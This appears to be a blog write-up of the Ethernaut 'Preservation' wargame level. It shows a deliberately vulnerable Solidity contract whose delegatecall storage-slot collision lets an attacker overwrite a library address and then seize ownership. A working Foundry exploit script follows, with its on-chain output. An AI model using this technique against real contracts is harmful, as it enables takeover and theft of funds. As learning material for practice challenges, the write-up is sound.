---
layout: post
title: "[Ethernaut] 16.Preservation"
tags: blockchain ethernaut foundry delegatecall storage
---

# Analysis

---

The goal is

1. claim ownership

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

In the Preservation contract, the `setFirstTime()` and `setSecondTime()` functions use delegatecall to update the `storedTime`.

As demonstrated in the [Delegation](https://0o3q.github.io/2025/04/19/delegation) challenge, `delegatecall` allows a called contract to modify the storage of the calling contract.

As can be inferred from the hint, storage is accessed by slot number rather than by variable name when using `delegatecall`.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";

contract Ex {
    address public AAAA;
    address public BBBB;
    address public owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

contract PreservationSol is Script {
    Preservation public pv_ = Preservation(0xD7cfE396981D91a4a11CB7261739F32F36cb9017);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();

        console.log("Before owner: ", pv_.owner());
        console.log("Before timeZone1Library address: ", pv_.timeZone1Library());

        pv_.setFirstTime(uint256(uint160(address(ex))));
        console.log("First set: ", pv_.timeZone1Library());

        pv_.setFirstTime(uint256(uint160(msg.sender)));
        console.log("After owner: ", pv_.owner());

        vm.stopBroadcast();
    }
}
```

We can first overwrite the `timeZone1Library` variable with the address of a malicious contract, and then use it to overwrite the `owner` variable.

```bash
$ forge script script/PreservationSol.sol:PreservationSol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Script ran successfully.

== Logs ==
  Before owner:  0x7B587eD6A41030bEFD2FE6437a895D22260F7132
  Before timeZone1Library address:  0xf24b27D4D691d05b59fb441d4df8374480D5E9Ac
  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4
  After timeZone1Library address:  0x21dA2776E60d5FAB93773eE66b547c54038350C4
  After owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514

## Setting up 1 EVM.

==========================

Chain 1001

Estimated gas price: 52.5 gwei

Estimated total gas used for script: 327554

Estimated amount required: 0.017196585 ETH

==========================
Enter keystore password:

##### 1001
✅  [Success] Hash: 0xbe01e24783ab42cd7662f2f25ed08617ff5d23ab1cf049118da11b30657d30e6
Contract Address: 0x21dA2776E60d5FAB93773eE66b547c54038350C4
Block: 185739056
Paid: 0.0065975525 ETH (239911 gas * 27.5 gwei)

##### 1001
✅  [Success] Hash: 0x4d6913ae6d8cb717ff25cd1d5fd1bb3f836b1678b435e445b030ec1f8c4f4fe4
Block: 185739056
Paid: 0.000976855 ETH (35522 gas * 27.5 gwei)

##### 1001
✅  [Success] Hash: 0x4442bf1e8285f7fbf1b46c906cfc03367926bdd3ac633b8c7fe653c8e2c63481
Block: 185739056
Paid: 0.0009108 ETH (33120 gas * 27.5 gwei)

✅ Sequence #1 on 1001 | Total Paid: 0.0084852075 ETH (308553 gas * avg 27.5 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```